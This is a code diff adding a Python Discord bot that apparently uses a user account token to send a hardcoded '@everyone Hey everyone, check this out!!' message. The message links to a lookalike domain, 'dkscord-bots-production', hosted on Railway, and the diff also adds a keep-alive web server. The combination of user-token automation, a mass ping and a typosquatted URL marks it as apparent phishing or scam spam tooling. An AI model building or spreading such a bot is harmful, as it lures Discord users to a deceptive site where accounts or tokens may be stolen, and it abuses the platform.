@@ -1,3 +1,23 @@
+import os
+import asyncio
+import aiohttp
+from aiohttp import web
+from discord.ext import commands
+import discord
+
+USER_TOKEN = os.getenv("DISCORD_USER_TOKEN")
+BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
+PORT = int(os.getenv("PORT", 8080))
+
+MESSAGE_TO_SEND = "@everyone Hey everyone, check this out!! https://dkscord-bots-production.up.railway.app"
+
+intents = discord.Intents.default()
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+@bot.event
+async def on_ready():
+    print(f'Bot {bot.user} listo y operativo.')
+
 @bot.command(name="send_now")
 async def send_now(ctx):
     if not USER_TOKEN:
@@ -49,3 +69,26 @@ async def send_now(ctx):
     except Exception as e:
         print(f"Error inesperado: {e}")
         await ctx.send("❌ Error 404")
+
+# Servidor para keep-alive
+async def http_server():
+    app = web.Application()
+
+    async def health_check(request):
+        return web.Response(text="Bot activo.")
+
+    app.router.add_get("/", health_check)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, "0.0.0.0", PORT)
+    await site.start()
+    print(f"🌐 Servidor web iniciado en puerto {PORT}")
+
+async def main():
+    asyncio.create_task(http_server())
+    await bot.start(BOT_TOKEN)
+
+if __name__ == "__main__":
+    import nest_asyncio
+    nest_asyncio.apply()
+    asyncio.run(main())
